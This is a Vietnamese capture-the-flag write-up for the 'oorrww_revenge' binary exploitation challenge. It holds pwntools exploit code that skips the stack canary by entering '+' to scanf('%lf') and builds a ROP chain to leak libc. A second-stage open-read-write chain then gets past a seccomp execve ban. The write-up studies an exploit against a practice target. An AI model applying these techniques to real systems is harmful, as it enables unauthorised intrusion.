# write up oorrww_revenge
```c
    for (v2 = 0; v2 <= 29; v2 += 1)
```
- bài lặp 30 lần
```c
    scanf("%lf",buff + (i << 3));
```
- mỗi lần lặp nhập 8 bytes
```assembly
0x00000000 | 0x00007fffffffe420 | 0x00007fffffffe608	0x000000010000000c	................ -> rsp 
0x00000010 | 0x00007fffffffe430 | 0x0000000000000040	0x0000000000000008	@...............        
0x00000020 | 0x00007fffffffe440 | 0x0000000000008000	0x0000000000000800	................ -> rdx 
0x00000030 | 0x00007fffffffe450 | 0x0000000000000800	0x0000000000090000	................        
0x00000040 | 0x00007fffffffe460 | 0x0000000000300000	0x0000000000300000	..0.......0.....        
0x00000050 | 0x00007fffffffe470 | 0x0000000000000100	0x00007fffffffe4a8	................        
0x00000060 | 0x00007fffffffe480 | 0x0000003c00000006	0x0000000000000000	....<...........        
0x00000070 | 0x00007fffffffe490 | 0x0000000000000000	0x0000000000000000	................        
0x00000080 | 0x00007fffffffe4a0 | 0x0000000000000000	0x0000000000000000	................        
0x00000090 | 0x00007fffffffe4b0 | 0x0000000000000000	0x0000000000000000	................        
0x000000a0 | 0x00007fffffffe4c0 | 0x0000000000000000	0x00007ffff7fe6cc0	.........l......        
0x000000b0 | 0x00007fffffffe4d0 | 0x0000000000000000	0x137c5674f1d7d800	............tV|.        
0x000000c0 | 0x00007fffffffe4e0 | 0x00007fffffffe580	0x00007ffff7db4c88	.........L...... -> rbp 

```
- vì frame chỉ chứa đc 192 bytes nên xảy ra buffer overflow
- vì bài có sẵn pop rax nên có thể kết hợp với 1 phần địa chỉ của hàm gifts để leak điạ chỉ 
- vì bài có canary nên muốn bỏ qua ghi đè canary cần nhập 1 ký tự đặc biệt là dấu + hoặc -
```python
    for i in range(19):
        pwn.log.info(f"time: {i+1}")
        payload = b"1"
        sla(b"input:\n",payload)
    sla(b"input:",b"+")
    payload = str(struct.unpack('d', pwn.p64(rbp1))[0]).encode()
    sla(b"input:",payload)
    payload = str(struct.unpack('d', pwn.p64(pop_rax))[0]).encode()
    sla(b"input:",payload)
    payload = str(struct.unpack('d', pwn.p64(exe.got.puts))[0]).encode()
    sla(b"input:",payload)
    payload = str(struct.unpack('d', pwn.p64(exe.sym.gifts+15))[0]).encode()
    sla(b"input:",payload)
    sla(b"input:",b"+")
    payload = str(struct.unpack('d', pwn.p64(exe.sym._start))[0]).encode()

```
- đầu tiên chỉ cần nhập 19 lần sau đó đến lần nhập của canary thì nhập dấu cộng bỏ qua canary, sau đó e nhập tiếp các payload còn lại, leak địa chỉ cần có pop rax, địa chỉ gots, và 1 phần của hàm gifts bắt đầu từ đây, cuối cùng là quay lại hàm main
```assembly
   0x00000000004012da <+15>:	mov    rdi,rax
   0x00000000004012dd <+18>:	call   0x4010c0 <puts@plt>
   0x00000000004012e2 <+23>:	nop
   ...
```
- sau khi có được địa chỉ libc, em tìm địa chỉ chứa format %s cùng với scanf để nhập lần tiếp theo với kích thước lớn để chứa payload và chạy 

```python
    arr = []
    arr.append(0x404128)
    arr.append(pop_rdi)
    arr.append(fmt)
    arr.append(pop_rsi)
    arr.append(0x404128+8)
    # arr.append(pop_rbp)
    # arr.append(0x404230)
    arr.append(ret)
    arr.append(exe.plt.__isoc99_scanf)
    arr.append(leave_ret)
```
- cuối cùng là payload open read write flag vì bài có sử dụng seccomp không cho thực thi execve, ở đây em read thêm 1 lần nữa bằng syscall vì em cảm giác scanf ignore 1 số ký tự trong payload 

- sau khi setup 
```bash
flag{dfashfsdjakfhdasjfhasdjfhdasfjd}
\x00\x00\x1a\x10@\x00\x00\x00\x00\x00\xe5\xa3B\xe1\xba\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00\x1a\x10@\x00\x00\x00\x00\x00\x03\x12@\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00Q\xbeB\xe1\xba\x00\x000D@\x
```

